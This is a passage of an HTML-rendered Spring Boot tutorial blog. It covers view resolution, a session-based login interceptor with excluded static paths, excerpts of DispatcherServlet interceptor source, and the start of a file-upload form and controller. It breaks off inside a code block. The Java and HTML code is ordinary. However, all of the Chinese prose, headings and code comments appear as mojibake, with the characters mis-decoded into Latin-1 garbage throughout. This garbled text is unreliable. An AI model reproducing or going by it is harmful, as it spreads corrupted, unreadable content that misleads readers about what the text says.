è§†å›¾å¯¹è±¡è°ƒç”¨è‡ªå®šä¹‰çš„renderè¿›è¡Œé¡µé¢æ¸²æŸ“å·¥ä½œã€‚</li></ol><ul><li><code>RedirectView</code> å¦‚ä½•æ¸²æŸ“ã€é‡å®šå‘åˆ°ä¸€ä¸ªé¡µé¢ã€‘</li><li>è·å–ç›®æ ‡urlåœ°å€</li><li><code>response.sendRedirect(encodedURL);</code></li></ul></li></ul></li></ol><p><strong>è§†å›¾è§£æ</strong>ï¼š<br>    - è¿”å›å€¼ä»¥ <code>forward:</code> å¼€å§‹ï¼š <code>new InternalResourceView(forwardUrl);</code> â€“&gt;  è½¬å‘<code>request.getRequestDispatcher(path).forward(request, response);</code><br>    - è¿”å›å€¼ä»¥ <code>redirect:</code> å¼€å§‹ï¼š <code>new RedirectView()</code> â€“&gt; renderå°±æ˜¯é‡å®šå‘<br>    - è¿”å›å€¼æ˜¯æ™®é€šå­—ç¬¦ä¸²ï¼š<code>new ThymeleafView()</code>â€”&gt;</p><hr><p>é˜…è¯»æºç ï¼šæœ€å¥½è‡ªå·±åœ¨IDEï¼Œæ‰“æ–­ç‚¹ï¼Œä¸”Debugæ¨¡å¼è¿è¡Œå®ä¾‹ï¼Œè¿™æ ·æ¯”è¾ƒæ²¡é‚£ä¹ˆæ²‰é—·ã€‚</p><h2 id="48ã€æ‹¦æˆªå™¨-ç™»å½•æ£€æŸ¥ä¸é™æ€èµ„æºæ”¾è¡Œ"><a href="#48ã€æ‹¦æˆªå™¨-ç™»å½•æ£€æŸ¥ä¸é™æ€èµ„æºæ”¾è¡Œ" class="headerlink" title="48ã€æ‹¦æˆªå™¨-ç™»å½•æ£€æŸ¥ä¸é™æ€èµ„æºæ”¾è¡Œ"></a>48ã€æ‹¦æˆªå™¨-ç™»å½•æ£€æŸ¥ä¸é™æ€èµ„æºæ”¾è¡Œ</h2><ol><li><p>ç¼–å†™ä¸€ä¸ªæ‹¦æˆªå™¨å®ç°<code>HandlerInterceptor</code>æ¥å£</p></li><li><p>æ‹¦æˆªå™¨æ³¨å†Œåˆ°å®¹å™¨ä¸­ï¼ˆå®ç°<code>WebMvcConfigurer</code>çš„<code>addInterceptors()</code>ï¼‰</p></li><li><p>æŒ‡å®šæ‹¦æˆªè§„åˆ™ï¼ˆ<span style="color:red;">æ³¨æ„</span>ï¼Œå¦‚æœæ˜¯æ‹¦æˆªæ‰€æœ‰ï¼Œé™æ€èµ„æºä¹Ÿä¼šè¢«æ‹¦æˆªã€‘</p></li></ol><p>ç¼–å†™ä¸€ä¸ªå®ç°<code>HandlerInterceptor</code>æ¥å£çš„æ‹¦æˆªå™¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * ç›®æ ‡æ–¹æ³•æ‰§è¡Œä¹‹å‰</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">requestURI</span> <span class="hljs-operator">=</span> request.getRequestURI();<br>        log.info(<span class="hljs-string">&quot;preHandleæ‹¦æˆªçš„è¯·æ±‚è·¯å¾„æ˜¯&#123;&#125;&quot;</span>,requestURI);<br><br>        <span class="hljs-comment">//ç™»å½•æ£€æŸ¥é€»è¾‘</span><br>        <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> request.getSession();<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">loginUser</span> <span class="hljs-operator">=</span> session.getAttribute(<span class="hljs-string">&quot;loginUser&quot;</span>);<br><br>        <span class="hljs-keyword">if</span>(loginUser != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-comment">//æ”¾è¡Œ</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-comment">//æ‹¦æˆªä½ã€‚æœªç™»å½•ã€‚è·³è½¬åˆ°ç™»å½•é¡µ</span><br>        request.setAttribute(<span class="hljs-string">&quot;msg&quot;</span>,<span class="hljs-string">&quot;è¯·å…ˆç™»å½•&quot;</span>);<br><span class="hljs-comment">//        re.sendRedirect(&quot;/&quot;);</span><br>        request.getRequestDispatcher(<span class="hljs-string">&quot;/&quot;</span>).forward(request,response);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * ç›®æ ‡æ–¹æ³•æ‰§è¡Œå®Œæˆä»¥å</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        log.info(<span class="hljs-string">&quot;postHandleæ‰§è¡Œ&#123;&#125;&quot;</span>,modelAndView);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * é¡µé¢æ¸²æŸ“ä»¥å</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        log.info(<span class="hljs-string">&quot;afterCompletionæ‰§è¡Œå¼‚å¸¸&#123;&#125;&quot;</span>,ex);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‹¦æˆªå™¨æ³¨å†Œåˆ°å®¹å™¨ä¸­ &amp;&amp; æŒ‡å®šæ‹¦æˆªè§„åˆ™ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminWebConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> &#123;<br>        registry.addInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginInterceptor</span>())<span class="hljs-comment">//æ‹¦æˆªå™¨æ³¨å†Œåˆ°å®¹å™¨ä¸­</span><br>                .addPathPatterns(<span class="hljs-string">&quot;/**&quot;</span>)  <span class="hljs-comment">//æ‰€æœ‰è¯·æ±‚éƒ½è¢«æ‹¦æˆªåŒ…æ‹¬é™æ€èµ„æº</span><br>                .excludePathPatterns(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;/login&quot;</span>,<span class="hljs-string">&quot;/css/**&quot;</span>,<span class="hljs-string">&quot;/fonts/**&quot;</span>,<span class="hljs-string">&quot;/images/**&quot;</span>,<br>                        <span class="hljs-string">&quot;/js/**&quot;</span>,<span class="hljs-string">&quot;/aa/**&quot;</span>); <span class="hljs-comment">//æ”¾è¡Œçš„è¯·æ±‚</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="49ã€æ‹¦æˆªå™¨-ã€æºç åˆ†æã€‘-æ‹¦æˆªå™¨çš„æ‰§è¡Œæ—¶æœºå’ŒåŸç†"><a href="#49ã€æ‹¦æˆªå™¨-ã€æºç åˆ†æã€‘-æ‹¦æˆªå™¨çš„æ‰§è¡Œæ—¶æœºå’ŒåŸç†" class="headerlink" title="49ã€æ‹¦æˆªå™¨-ã€æºç åˆ†æã€‘-æ‹¦æˆªå™¨çš„æ‰§è¡Œæ—¶æœºå’ŒåŸç†"></a>49ã€æ‹¦æˆªå™¨-ã€æºç åˆ†æã€‘-æ‹¦æˆªå™¨çš„æ‰§è¡Œæ—¶æœºå’ŒåŸç†</h2><ol><li>æ ¹æ®å½“å‰è¯·æ±‚ï¼Œæ‰¾åˆ°<code>HandlerExecutionChain</code>ï¼ˆå¯ä»¥å¤„ç†è¯·æ±‚çš„handlerä»¥åŠhandlerçš„æ‰€æœ‰ æ‹¦æˆªå™¨ï¼‰</li><li>å…ˆæ¥é¡ºåºæ‰§è¡Œ æ‰€æœ‰æ‹¦æˆªå™¨çš„ <code>preHandle()</code>æ–¹æ³•ã€‚<ul><li>å¦‚æœå½“å‰æ‹¦æˆªå™¨<code>preHandle()</code>è¿”å›ä¸º<code>true</code>ã€‚åˆ™æ‰§è¡Œä¸‹ä¸€ä¸ªæ‹¦æˆªå™¨çš„<code>preHandle()</code></li><li>å¦‚æœå½“å‰æ‹¦æˆªå™¨è¿”å›ä¸º<code>false</code>ã€‚ç›´æ¥å€’åºæ‰§è¡Œæ‰€æœ‰å·²ç»æ‰§è¡Œäº†çš„æ‹¦æˆªå™¨çš„  <code>afterCompletion();</code>ã€‚</li></ul></li><li>å¦‚æœä»»ä½•ä¸€ä¸ªæ‹¦æˆªå™¨è¿”å›<code>false</code>ï¼Œç›´æ¥è·³å‡ºä¸æ‰§è¡Œç›®æ ‡æ–¹æ³•ã€‚</li><li>æ‰€æœ‰æ‹¦æˆªå™¨éƒ½è¿”å›<code>true</code>ï¼Œæ‰æ‰§è¡Œç›®æ ‡æ–¹æ³•ã€‚</li><li>å€’åºæ‰§è¡Œæ‰€æœ‰æ‹¦æˆªå™¨çš„<code>postHandle()</code>æ–¹æ³•ã€‚</li><li>å‰é¢çš„æ­¥éª¤æœ‰ä»»ä½•å¼‚å¸¸éƒ½ä¼šç›´æ¥å€’åºè§¦å‘ <code>afterCompletion()</code>ã€‚</li><li>é¡µé¢æˆåŠŸæ¸²æŸ“å®Œæˆä»¥åï¼Œä¹Ÿä¼šå€’åºè§¦å‘ <code>afterCompletion()</code>ã€‚</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202207211315633.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><code>DispatcherServlet</code>ä¸­æ¶‰åŠåˆ°<code>HandlerInterceptor</code>çš„åœ°æ–¹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FrameworkServlet</span> &#123;<br>    <br>    ...<br>    <br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">processedRequest</span> <span class="hljs-operator">=</span> request;<br><span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">mappedHandler</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">multipartRequestParsed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><br><span class="hljs-type">WebAsyncManager</span> <span class="hljs-variable">asyncManager</span> <span class="hljs-operator">=</span> WebAsyncUtils.getAsyncManager(request);<br><br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">ModelAndView</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-type">Exception</span> <span class="hljs-variable">dispatchException</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>            ...<br>            <br>                <span class="hljs-comment">//è¯¥æ–¹æ³•å†…è°ƒç”¨HandlerInterceptorçš„preHandle()</span><br><span class="hljs-keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">// Actually invoke the handler.</span><br>mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br><br>            ...<br>                <span class="hljs-comment">//è¯¥æ–¹æ³•å†…è°ƒç”¨HandlerInterceptorçš„postHandle()</span><br>mappedHandler.applyPostHandle(processedRequest, response, mv);<br>&#125;<br>        processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>            <span class="hljs-comment">//è¯¥æ–¹æ³•å†…è°ƒç”¨HandlerInterceptoræ¥å£çš„afterCompletionæ–¹æ³•</span><br>triggerAfterCompletion(processedRequest, response, mappedHandler, ex);<br>&#125;<br><span class="hljs-keyword">catch</span> (Throwable err) &#123;<br>            <span class="hljs-comment">//è¯¥æ–¹æ³•å†…è°ƒç”¨HandlerInterceptoræ¥å£çš„afterCompletionæ–¹æ³•</span><br>triggerAfterCompletion(processedRequest, response, mappedHandler,<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">NestedServletException</span>(<span class="hljs-string">&quot;Handler processing failed&quot;</span>, err));<br>&#125;<br><span class="hljs-keyword">finally</span> &#123;<br>...<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">triggerAfterCompletion</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response,</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> HandlerExecutionChain mappedHandler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-keyword">if</span> (mappedHandler != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//è¯¥æ–¹æ³•å†…è°ƒç”¨HandlerInterceptoræ¥å£çš„afterCompletionæ–¹æ³•</span><br>mappedHandler.triggerAfterCompletion(request, response, ex);<br>&#125;<br><span class="hljs-keyword">throw</span> ex;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processDispatchResult</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response,</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> HandlerExecutionChain mappedHandler, <span class="hljs-meta">@Nullable</span> ModelAndView mv,</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> Exception exception)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        ...<br><br><span class="hljs-keyword">if</span> (mappedHandler != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//è¯¥æ–¹æ³•å†…è°ƒç”¨HandlerInterceptoræ¥å£çš„afterCompletionæ–¹æ³•</span><br><span class="hljs-comment">// Exception (if any) is already handled..</span><br>mappedHandler.triggerAfterCompletion(request, response, <span class="hljs-literal">null</span>);<br>&#125;<br>&#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HandlerExecutionChain</span> &#123;<br>    <br>    ...<br>    <br><span class="hljs-type">boolean</span> <span class="hljs-title function_">applyPreHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.interceptorList.size(); i++) &#123;<br><span class="hljs-type">HandlerInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.interceptorList.get(i);<br>            <span class="hljs-comment">//HandlerInterceptorçš„preHandleæ–¹æ³•</span><br><span class="hljs-keyword">if</span> (!interceptor.preHandle(request, response, <span class="hljs-built_in">this</span>.handler)) &#123;<br>                <br>triggerAfterCompletion(request, response, <span class="hljs-literal">null</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-built_in">this</span>.interceptorIndex = i;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br>    <br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">applyPostHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, <span class="hljs-meta">@Nullable</span> ModelAndView mv)</span><br><span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.interceptorList.size() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br><span class="hljs-type">HandlerInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.interceptorList.get(i);<br>            <br>            <span class="hljs-comment">//HandlerInterceptoræ¥å£çš„postHandleæ–¹æ³•</span><br>interceptor.postHandle(request, response, <span class="hljs-built_in">this</span>.handler, mv);<br>&#125;<br>&#125;<br>    <br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">triggerAfterCompletion</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, <span class="hljs-meta">@Nullable</span> Exception ex)</span> &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.interceptorIndex; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br><span class="hljs-type">HandlerInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.interceptorList.get(i);<br><span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">//HandlerInterceptoræ¥å£çš„afterCompletionæ–¹æ³•</span><br>interceptor.afterCompletion(request, response, <span class="hljs-built_in">this</span>.handler, ex);<br>&#125;<br><span class="hljs-keyword">catch</span> (Throwable ex2) &#123;<br>logger.error(<span class="hljs-string">&quot;HandlerInterceptor.afterCompletion threw exception&quot;</span>, ex2);<br>&#125;<br>&#125;<br>&#125;<br>    <br>    <br>&#125; <br>    <br></code></pre></td></tr></table></figure><h2 id="50ã€æ–‡ä»¶ä¸Šä¼ -å•æ–‡ä»¶ä¸å¤šæ–‡ä»¶ä¸Šä¼ çš„ä½¿ç”¨"><a href="#50ã€æ–‡ä»¶ä¸Šä¼ -å•æ–‡ä»¶ä¸å¤šæ–‡ä»¶ä¸Šä¼ çš„ä½¿ç”¨" class="headerlink" title="50ã€æ–‡ä»¶ä¸Šä¼ -å•æ–‡ä»¶ä¸å¤šæ–‡ä»¶ä¸Šä¼ çš„ä½¿ç”¨"></a>50ã€æ–‡ä»¶ä¸Šä¼ -å•æ–‡ä»¶ä¸å¤šæ–‡ä»¶ä¸Šä¼ çš„ä½¿ç”¨</h2><ul><li>é¡µé¢ä»£ç <code>/static/form/form_layouts.html</code></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;form&quot;</span> <span class="hljs-attr">th:action</span>=<span class="hljs-string">&quot;@&#123;/upload&#125;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;exampleInputEmail1&quot;</span>&gt;</span>é‚®ç®±<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exampleInputEmail1&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Enter email&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;exampleInputPassword1&quot;</span>&gt;</span>åå­—<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exampleInputPassword1&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Password&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;exampleInputFile&quot;</span>&gt;</span>å¤´åƒ<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;headerImg&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exampleInputFile&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;exampleInputFile&quot;</span>&gt;</span>ç”Ÿæ´»ç…§<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;photos&quot;</span> <span class="hljs-attr">multiple</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;checkbox&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span>&gt;</span> Check me out<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>æäº¤<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>æ§åˆ¶å±‚ä»£ç </li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 